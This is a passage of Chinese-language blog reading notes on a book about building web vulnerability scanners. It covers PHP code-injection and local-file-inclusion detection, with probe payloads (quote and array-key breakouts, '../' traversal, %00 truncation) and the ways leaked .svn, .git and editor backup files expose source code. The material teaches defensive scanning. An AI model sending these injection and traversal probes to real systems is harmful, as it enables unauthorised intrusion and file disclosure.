src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F95.png" alt="此处输入图片的描述"></p><p>代码中的<code>&quot;$a()&quot;</code> 属于可变函数， 结合可变变量的用法， 这里以函数来替换变量， 即为：<code>$&#123;print(md5(imiyoo))&#125;</code>。这样就可以执行print()函数了。由千print函数比较特殊， 这里有必要说明一下。</p><p><strong>3.print函数</strong></p><p><strong>print 函数实际上不是一个真正意义上的函数，而是一个语言结构</strong>，因此它可以不必使用括<br>号。但由千它具备函数的形式， 所以也可以使用带括号的形式。写成如下的形式也是可以的：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F96.png" alt="此处输入图片的描述"></p><p>那么现在针对场景三， 我们可以构造如下的语句进行测试。</p><p><strong>前端输入：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F97.png" alt="此处输入图片的描述"></p><p>访问链接 <a href="http://localhost/book/cmd/3_cmd.php?data=test;$%7Bprint(md5(imiyoo)">http://localhost/book/cmd/3_cmd.php?data=test;${print(md5(imiyoo)</a>) }。</p><p><strong>测试效果如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F98.png" alt="此处输入图片的描述"></p><h6 id="场景四："><a href="#场景四：" class="headerlink" title="场景四："></a><strong>场景四：</strong></h6><p>用户的输入以单引号或双引号的形式赋值给某个变量。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F99.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F100.png" alt="此处输入图片的描述"></p><p>由于变量在单引号里面，<strong>因此需要先将两边的单引号闭合</strong>，然后用<strong>分号来分割语</strong>句，这样就能执行PHP代码了，构造输入如下。</p><p><strong>前端输入：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F101.png" alt="此处输入图片的描述"></p><p>访问链接 <a href="http://localhost/book/cmd/4_cmd.php?data=">http://localhost/book/cmd/4_cmd.php?data=</a> test’;${print(md5(imiyoo)) };’.</p><p><strong>测试效果如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F102.png" alt="此处输入图片的描述"></p><h6 id="场景五："><a href="#场景五：" class="headerlink" title="场景五："></a><strong>场景五：</strong></h6><p>将用户的输入作为数组的key进行赋值。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F103.png" alt="此处输入图片的描述"></p><p>这里前端输入的变量作为数组的key, <strong>为了执行代码， 需要从key的位置中跳出来</strong>，因此可以通过下面的形式进行闭合， 构造如下语句。</p><p><strong>前端输入：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F104.png" alt="此处输入图片的描述"></p><p>访问链接 <a href="http://localhost/book/cmd/5_cmd.php?data=test%22%5D=">http://localhost/book/cmd/5_cmd.php?data=test&quot;]=</a> 1;$ {print(md5(imiyoo))};&#x2F;&#x2F;</p><p><strong>测试效果如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F105.png" alt="此处输入图片的描述"></p><h5 id="3-检测原理"><a href="#3-检测原理" class="headerlink" title="3.检测原理"></a><strong>3.检测原理</strong></h5><p>下面讲一下命令执行注入的检测原理。</p><p>首先，需要结合漏洞的场景，<strong>对原有的语旬逻辑进行闭合</strong>。<br>然后，通过特性字符或特性用法<strong>注入有预期输出的命令语句</strong>。<br>最后，根据响应<strong>输出的内容进行漏洞判定</strong>。</p><p>如果目标存在命令注入执行漏洞，那么预期的内容就会显性地输出到页面。 同理，如果目标不存在该漏洞，那么页面就不会出现预期的内容。</p><p>下面构造该漏洞对应的扫描载荷，将命令执行注入漏洞的场景及检测数据整理如下表：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F106.png" alt="此处输入图片的描述"></p><p>该漏洞场景实质上<strong>覆盖了两类情况</strong>： 一类是<strong>系统层面的命令执行</strong>；另一类是<strong>应用层面的命令执行</strong>。</p><p>由于它们的命令特征函数并不相同，因此可以分类对其进行检测。根据上面的检测原理和对应的扫描载荷， 来实现针对命令执行注入漏洞的检测， </p><p><strong>部分代码如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F107.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F108.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F109.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F110.png" alt="此处输入图片的描述"></p><h4 id="4-文件包含漏洞"><a href="#4-文件包含漏洞" class="headerlink" title="(4)文件包含漏洞"></a><strong>(4)文件包含漏洞</strong></h4><h5 id="1-漏洞的分类"><a href="#1-漏洞的分类" class="headerlink" title="1.漏洞的分类"></a><strong>1.漏洞的分类</strong></h5><p>分为远程文件包含合本地文件包含，本质上是一样的(当然在 PHP 的设置上有些不同)，本书只介绍本地文件包含漏洞</p><h5 id="2-漏洞利用场景"><a href="#2-漏洞利用场景" class="headerlink" title="2.漏洞利用场景"></a><strong>2.漏洞利用场景</strong></h5><h6 id="场景一："><a href="#场景一：" class="headerlink" title="场景一："></a><strong>场景一：</strong></h6><p>将前端获取的变量直接传递给文件包含函数。</p><p><strong>后端代码：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F111.png" alt="此处输入图片的描述"></p><p>这里将前端获取的文件名直接传递到文件包含函数中，<strong>中间没有任何过滤</strong>，因此我们可以控制包含的文件名变最。当前端输入如下的内容：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F112.png" alt="此处输入图片的描述"></p><p>那么就可以直接读取 Linux 系统中的账号和密码文件了(当然这个文件的是普通用户可以读的，不能说明权限问题，另外如果可能还会受到 open_basedir 的路径限制，下面我们会说到)， 如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F113.png" alt="此处输入图片的描述"></p><p>但在实际的测试中，像lnmp这种一键集成环境部署工具本身就已做过一些安全加固措施，在网站的根目录下会有一个 .user.ini 隐藏文件，会限定文件的读取目录，内容如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F114.png" alt="此处输入图片的描述"></p><p>因此，我们只能在限定路径内去寻找有预期输出的文件进行漏洞判定。<strong>针对当前的环境，有下面两种方式：</strong></p><p><strong>方法一：</strong></p><p>利用&#x2F;proc&#x2F; 目录下的文件， Linux 内核提供了一种通过&#x2F;proc文件系统，<strong>在运行时访问内核内部数据结构、 改变内核设置的机制</strong>。它以文件系统的方式为访问系统内核数据的操作提供接口，用户和应用程序可以通过proc得到系统的信息。该目录下可作为预期输出的文件，如下表：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F115.png" alt="此处输入图片的描述"></p><p><strong>方法二：</strong></p><p><strong>有针对性地去找一些系统默认的配置文件和隐藏文件</strong>，比如，在当前的lnmp环境下，可以通过隐藏文件.user.ini进行漏洞检测和判定。为了描述简单和易于理解， 这里用第一种方法进行语句构造。</p><p><strong>前端输入：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F116.png" alt="此处输入图片的描述"></p><p>访问链接： <a href="http://localhost/book/lfi/1_lfi.php?data=/proc/meminfo">http://localhost/book/lfi/1_lfi.php?data=/proc/meminfo</a></p><p><strong>测试效果如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F117.png" alt="此处输入图片的描述"></p><h6 id="场景二-1"><a href="#场景二-1" class="headerlink" title="场景二"></a><strong>场景二</strong></h6><p>将前端获取的变量名通过<strong>拼接目录名</strong>，直接传递给文件包含函数。</p><p><strong>后端代码：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F118.png" alt="此处输入图片的描述"></p><p>代码中的文件名前面还有目录名，程序员本来是想只允许包含该目录下的文件，但由于这里并没有任何限制， 因此， <strong>可以利用目录跳转”..&#x2F;“进行突破</strong>， 跳出当前所在的目录， 这样就又可以包含任意文件了。 </p><p>由于这里并不知道上级目录的级数，没有合适的参考路径，所以<strong>需要用多级目录跳转</strong>，直至根目录，然后从根目录开始选择有预期输出的文件， 因此构造如下的语句。</p><p><strong>前端输入：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F119.png" alt="此处输入图片的描述"></p><p>访问链接 <a href="http://localhost/book/lfi/2_lfi.php?data=../../../../../../../../../../proc/meminfo">http://localhost/book/lfi/2_lfi.php?data=../../../../../../../../../../proc/meminfo</a> </p><p><strong>测试效果如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F120.png" alt="此处输入图片的描述"></p><h6 id="场景三-1"><a href="#场景三-1" class="headerlink" title="场景三"></a><strong>场景三</strong></h6><p>将前端获取的变量通过<strong>拼接扩展名</strong>，然后直接传递给文件包含函数。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F121.png" alt="此处输入图片的描述"></p><p>这里程序<strong>限制了文件的扩展名</strong>，由于只能包含特定扩展名的文件，<strong>这样就不能包含有预期输出的文件了</strong>，所以也就无法进行正常的检测。但是可以<strong>利用字符串截断的特性进行突破</strong>：</p><p><strong>%00截断</strong></p><p>十六进制0X00是字符串结束的标志。如果是字符串类型，在遇到0X00时就会截断，其后的字节不会再作为字符串的内容。这样就可以利用0X00来截断后面的扩展名，从而可以包含任意文件。<strong>%00是0X00在URL中的表现</strong>形式，因此可以构造如下的语句进行检测：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F121.png" alt="此处输入图片的描述"></p><p><strong>长度截断</strong></p><p>通常Windows的截断长度为240, Linux的截断长度为4096**。由于Windows和Linux的文件名都有一个最大路径长度(MAX]ATH)的限制**，因此当提交文件名的长度超过了最大路径长度的限制时就会截断后面的内容，从而可以无障碍地包含任意文件。</p><p>在实际的测试中， 可以用一定数最的字符”.”、”&#x2F;“或者”.&#x2F;“来突破操作系统对文件名的最大长度限制，截断后面的字符串。</p><blockquote><p><strong>注意：</strong><br>%00截断和长度截断在PHP5.4以上版本都已经修复，因此在测试环境中并不能重现，但这也是一种攻击的重要思路，依然需要重点掌握。</p></blockquote><p>文件包含漏洞的检测其实相对简单， 因为它有非常明显的输入和输出，<strong>所以只需要根据不同的漏洞场景，通过构造语句读取有预期输出的文件，然后通过相应的特征匹配， 就可以实现漏洞检测</strong>。如果目标存在漏洞， 那么对应的文件就会被读取，而文件中的内容也会被输出到响应页面中，这样就可以根据文件的内容特征进行匹配， 从而进行后续的漏洞判定。</p><p><strong>扫描载荷的情况如下表：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F123.png" alt="此处输入图片的描述"></p><p>在文件包含的检测中，经常会碰到一种情况：<strong>在原始响应页面中就存在特征内容， 这样就会造成明显的误报，</strong> 因此需要<strong>先对原始请求的内容进行预判，然后再进行对应的漏洞检测</strong>。具<br>体的核心检测代码如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F124.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F125.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F126.png" alt="此处输入图片的描述"></p><p>这里面的函数书写模式和之前的其他漏洞的检测模式基本一样，这里就不再多解释了</p><h4 id="5-敏感文件泄露"><a href="#5-敏感文件泄露" class="headerlink" title="(5)敏感文件泄露"></a><strong>(5)敏感文件泄露</strong></h4><h5 id="1-概念以及原理"><a href="#1-概念以及原理" class="headerlink" title="1.概念以及原理"></a><strong>1.概念以及原理</strong></h5><p>敏感文件泄露主要由于人为的疏忽或工具的特性等原因所致。由于没有技术含量，所以经常不被人重视。但它却最容易导致服务器被攻击和入侵，攻击者利用这些细节可以有效地探测到敏感文件信息，而这些敏感文件通常包含账号、密码等重要信息，然后利用这些账号信息访问未授权系统实现进一步攻击，从而完成最终的入侵和数据窃取。</p><h5 id="2-敏感文件泄露漏洞场景"><a href="#2-敏感文件泄露漏洞场景" class="headerlink" title="2.敏感文件泄露漏洞场景"></a><strong>2.敏感文件泄露漏洞场景</strong></h5><h6 id="场景一-1"><a href="#场景一-1" class="headerlink" title="场景一"></a><strong>场景一</strong></h6><p>管理员为了对网站数据进行备份，直接对网站目录下的所有文件打包，并将其存放在网站的web根目录下。同时为了简单易记通常会将其命名如：wwwroot.rar、wwwroot.zip、1.zip、w.zip、bak.zip等，而网站目录中的这些文件，在没有额外控制策略的情况下，任何人都可以直接访问和下载</p><h6 id="场景二-2"><a href="#场景二-2" class="headerlink" title="场景二"></a><strong>场景二</strong></h6><p>开发人员在使用版本控制工具（如： GIT、SVN、CVS等）进行项目部署时，没有删除根目录下的隐藏备份文件。攻击者利用这些文件可换取项目源代码或配置文件等敏感信息， 从而完成后续的攻击和入侵。</p><p><strong>SVN敏感信息泄露</strong></p><p>SVN (Subversion)是一个自由、 开源的项目<strong>源代码版本控制工具</strong>。 目前，绝大多数开源软件和企业代码管理， 都使用SVN作为代码版本管理软件。 开发人员使用”svn checkout” 来检出项目代码时， 在项目根目录下会有一个隐藏目录.svn, 内容如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F127.png" alt="此处输入图片的描述"></p><p>其中， 项目源码文件都备份在pristine目录下，we.db是一个SQLite数据库文件，里面记录着项目源码文件在pristine目录下的对应路径，可以通过下面命令获取：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F128.png" alt="此处输入图片的描述"></p><p>而对于SVN的1.6.X及以下版本，则可以通过对.svn隐藏目录中的entries文件进行解析，这样就可以获取项目源码的目录结构和文件内容。entries文件的解析也非常简单， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F129.png" alt="此处输入图片的描述"></p><blockquote><p><strong>注意：</strong><br>SVN的1.6.X及以下版本是在每个文件夹都生成一个.svn隐藏文件夹，而SVN的1.7.X版只在版本库根目录下生成一个.svn隐藏文件夹，当给线上环境进行项目部署时，需要删除svn隐藏目录，或使用svn export进行项目部署； 也可以在服务器上进行配置 ，禁止访问.svn目录</p></blockquote><p><strong>Git敏感信息泄露</strong></p><p>Git是一款免费、开源的<strong>分布式版本控制系统</strong>，用于敏捷高效地处理任何或小或大的项目。很多企业也会选择使用它作为代码版本控制**。当使用git clone进行线上项目部署时**，git会把项目的信息隐藏在一个.git的文件夹里， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F130.png" alt="此处输入图片的描述"></p><p>其中，index文件实际上是一个包含文件索引的目录树，它记录了文件名、文件内容的SHA1哈希值和文件访问权限。ojbects目录中存放着所有Git对象，也包含项目源码的备份文件。通过对index文件进行解析，就能找到源文件在objects目录的对应关系，从而获取对应的源文件内容。</p><p>可以用git ls-files — stage命令来解析index文件， 如下</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F131.png" alt="此处输入图片的描述"></p><p>备份文件对象在objects目录的存储原则为： SHA1 哈希值的前两位是文件夹名称， 后38<br>位作为对象文件名。比如，上图中README.md的文件SHA1哈希值为：adeb458def7e52e3ablb4ac586ac49ef49c5b373, 那么对应的文件路径则为：objects&#x2F;ad&#x2F;eb458def7e52e3abl4ac586ac49ef49c5b373, 两个文件的内容是 致的， 如下</p><p><strong>查看备份文件的内容：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F132.png" alt="此处输入图片的描述"></p><p>在Git系统中， 备份文件对象有两种存储方式， <strong>一种是松散对象存储</strong>， 就是前面提到的；另一种是<strong>打包对象存储</strong>， 它会对松散对象中的文件进行打包存储，此时objects的目录结构如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F133.png" alt="此处输入图片的描述"></p><p>如果要想获取项目源文件信息，那么需要先对其进行解包，然后按照松散对象的方式来获取，解包的具体操作方式如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F134.png" alt="此处输入图片的描述"></p><p>至于打包文件的文件名，可以从 objects&#x2F;info&#x2F;packs 中获取，当使用 git gc 命令对松散对象进行打包时， 会在 objects&#x2F;info&#x2F;packs 文件中记录打包对象的文件名信息.</p><h6 id="场景三-2"><a href="#场景三-2" class="headerlink" title="场景三"></a><strong>场景三</strong></h6><p>如果开发人员在线上环境<strong>临时修改代码</strong>， 那么一些编辑工具会自动产生对应的备份文件，一旦疏忽， Web目录中就会留下.bak 、.swp 、.old 或～等扩展名的备份文件，特别是一些数据库配置文件。攻击者可以根据这个特性探测和获取目标的敏感信息</p><p>比如， Linux 下常用的编辑器Vi, 其特性为：当使用Vi 打开一个文件时，在同目录下会生成一个swp扩展名的隐藏文件，它主要起到临时备份和还原的作用。如果文件正常退出， 那么这个文件会自动删除， 没有影响；但如果文件异常退出或处正在于编辑时，那么这个文件就会持续存在。此时攻击者就可以下载该文件来获取敏感信息， 如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F135.png" alt="此处输入图片的描述"></p><p>然后通过vi -r即可恢复</p><h5 id="3-敏感文件泄露的检测原理"><a href="#3-敏感文件泄露的检测原理" class="headerlink" title="3.敏感文件泄露的检测原理"></a><strong>3.敏感文件泄露的检测原理</strong></h5><h6 id="1-压缩、备份类文件检测"><a href="#1-压缩、备份类文件检测" class="headerlink" title="1.压缩、备份类文件检测"></a><strong>1.压缩、备份类文件检测</strong></h6><p>对于压缩类的文件检测，只需要构造文件对应的 URL, 然后向目标请求该 URL. <strong>根据HTTP响应中的状态码及文件类型进行判断</strong>。 在这里其实并不需要获取 HTTP 响应中的响应体信息， <strong>只要通过响应头的 Content-type 字段的值即可判断</strong>。 为了提高检测效率 可以使用 HTTP 请求中的<strong>HEAD方法进行快速处理</strong>；而对于备份类的文件检测， 只需要关注动态脚本文件，并根据脚本语言的源码特征进行检测即可。</p><h6 id="2-版本类文件检测"><a href="#2-版本类文件检测" class="headerlink" title="2.版本类文件检测"></a><strong>2.版本类文件检测</strong></h6><p>版本类文件的检测， 可以根据特征文件的Content-type进行判断。 对于SVNl.6.X及以下的版本，可以通过.svn&#x2F;entries文件进行检测：对千SVNl.7.X以上的版本，可以通过.svn&#x2F;wc.db 文件进行检测；对千Git敏感文件泄露， 可以根据.git&#x2F;index这个文件进行检测。这些文件都属千二进制流文件， 因此其Content-type类型都是application&#x2F;octet-stream。</p><p>在敏感文件的检测中， 会对常见的压缩文件、 备份文件和版本文件进行探测和验证，查看目标是否存在敏感文件泄露， </p><p><strong>代码实现：</strong></p><p><strong>压缩、 备份类文件检测的部分检测代码如下</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F136.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F137.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F138.png" alt="此处输入图片的描述"></p><p><strong>版本类文件检测的部分检测代码如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F139.png" alt="此处输入图片的描述"></p><h2 id="0X06-参考链接"><a href="#0X06-参考链接" class="headerlink" title="0X06 参考链接"></a><strong>0X06 参考链接</strong></h2><p><a href="http://yuedu.163.com/book_reader/cc457ea1464d4bb6bd27a2082658a434_4/b517da182e6b4c119de3eca5f3891c91_4">http://yuedu.163.com/book_reader/cc457ea1464d4bb6bd27a2082658a434_4/b517da182e6b4c119de3eca5f3891c91_4</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《白帽子讲 web 扫描》 阅读记录(上)</title>
    <link href="/2019/03/03/%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2%20web%20%E6%89%AB%E6%8F%8F%E3%80%8B%20%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95(%E4%B8%8A)/"/>
    <url>/2019/03/03/%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2%20web%20%E6%89%AB%E6%8F%8F%E3%80%8B%20%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95(%E4%B8%8A)/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>目前市面上有关扫描器的书籍大概就是这本 《白帽子讲 web 扫描》了，虽然知道区区 200 多页的书籍内容的深度和广度不会很高，但是还是介绍了一些开发扫描器过程中的基本方法和关键的坑点，对于我这种初学者也算是一本不错的入门级教材了，本文是阅读这本书的读书记录，作为备忘。</p><h2 id="0X01-如何理解扫描器"><a href="#0X01-如何理解扫描器" class="headerlink" title="0X01 如何理解扫描器"></a><strong>0X01 如何理解扫描器</strong></h2><h3 id="1-概念以及原理"><a href="#1-概念以及原理" class="headerlink" title="1.概念以及原理"></a><strong>1.概念以及原理</strong></h3><p>Web 扫描器其实是一种<strong>自动化</strong>的安全弱点和风险检测工具：它的工作方式和原理主要是<strong>通过分析HTTP (s) 请求和响应</strong>来发现安全问题和风险</p><span id="more"></span><h3 id="2-作用以及目的"><a href="#2-作用以及目的" class="headerlink" title="2.作用以及目的"></a><strong>2.作用以及目的</strong></h3><p>在对一个目标进行渗透测试时，<strong>首先需要进行信息收集，然后再对这些信息进行漏洞审计</strong>。其中，<strong>信息收集</strong>的目的是最大化地收集与目标有关联的信息，<strong>提供尽可能多的攻击入口</strong>；<strong>漏洞审计</strong>则是对这些可能的攻击入口进行安全分析和检测， 来<strong>验证这些攻击入口是否可以被利用</strong>。 </p><p>由于这两个环节的工作更多是具有发散性的，因此人工的工作量就会非常大。 这个时候就我们需要用到Web扫描器，其实它的<strong>目的就是尽可能地帮助我们自动完成这两个环节，方便安全测 试人员快速获取目标可供利用的漏洞以便进行后续渗透工作。</strong></p><h3 id="3-扫描器的类型"><a href="#3-扫描器的类型" class="headerlink" title="3.扫描器的类型"></a><strong>3.扫描器的类型</strong></h3><h4 id="1-主动型"><a href="#1-主动型" class="headerlink" title="(1)主动型"></a><strong>(1)主动型</strong></h4><p>主动型的意思就是说，当对目标进行扫描时，<strong>扫描请求是主动发起的</strong>，所以称之为主动型，常见的有 AWVS Nessus 等</p><h4 id="2-被动型"><a href="#2-被动型" class="headerlink" title="(2)被动型"></a><strong>(2)被动型</strong></h4><p>不会向目标发送扫描请求，而是<strong>通过中间代理或流量镜像的方式</strong>，通过网络流量的真实请求去发现和告知可能存在的安全缺陷或漏洞。常见的有 GourdScan 和 NagaScan</p><h4 id="3-云端型"><a href="#3-云端型" class="headerlink" title="(3)云端型"></a><strong>(3)云端型</strong></h4><p>一些在线的扫描器，这里就不再列举了。</p><h2 id="0X02-爬虫基础"><a href="#0X02-爬虫基础" class="headerlink" title="0X02 爬虫基础"></a><strong>0X02 爬虫基础</strong></h2><h3 id="1-HTTP-认证"><a href="#1-HTTP-认证" class="headerlink" title="1.HTTP 认证"></a><strong>1.HTTP 认证</strong></h3><p>爬虫在爬取资源的过程中，有时候会遇到 HTTP 认证的情况，也就是说，Web 服务器会对客户端的权限进行认证，只有认证通过才允许其访问服务端的资源。</p><h4 id="1-Basic-认证"><a href="#1-Basic-认证" class="headerlink" title="(1) Basic 认证"></a><strong>(1) Basic 认证</strong></h4><p>Basic认证是HTTP常用的一种认证方式， 由于HTTP协议是无状态的， 所以客户端每次访问Web应用时，<strong>都要在请求的头部携带认证信息</strong>， 一般是用户名和密码， 如果验证不通过， 则会提示如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F1.png" alt="此处输入图片的描述"></p><p>Basic认证的请求和响应， 抓包如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F2.png" alt="此处输入图片的描述"></p><p>其中， HTTP请求中的Authorization字段包含着用户名和密码信息， Basic后面的一串字符：”YWRtaW46c2VjcmVO” 即为用户名和密码的 Base64 编码，解码后的内容为：admin:secret。</p><p>从上面的描述中，我们可以看到，Basic 认证的缺点很明显，<strong>它是按照明文信息进行传递的，因此很容易被中间人劫持获取。</strong></p><h4 id="2-Digest认证（摘要式）"><a href="#2-Digest认证（摘要式）" class="headerlink" title="(2) Digest认证（摘要式）"></a><strong>(2) Digest认证（摘要式）</strong></h4><p>Digest 认证其实是一种基于挑战－应答模式的认证模型，它比 Basic 更安全。为了防止重放攻击，客户端在发送第一个请求后，会受到一个状态码为 401 的响应，响应内容包含一个唯一的字符串 : nonce ,且每次请求返回的内容都不一样。摘要式认证过程需要两次交互来完成</p><h5 id="1-第一次交互"><a href="#1-第一次交互" class="headerlink" title="1.第一次交互"></a><strong>1.第一次交互</strong></h5><p>客户端在向服务端发送请求后， 服务端会返回 401 UNAUTHORIZED, 同时在响应头中的 WWW-Authenticate 字段说明认证方式是 Digest, 其他信息还有 realm 域信息、 nonce 随机字符串、 opaque 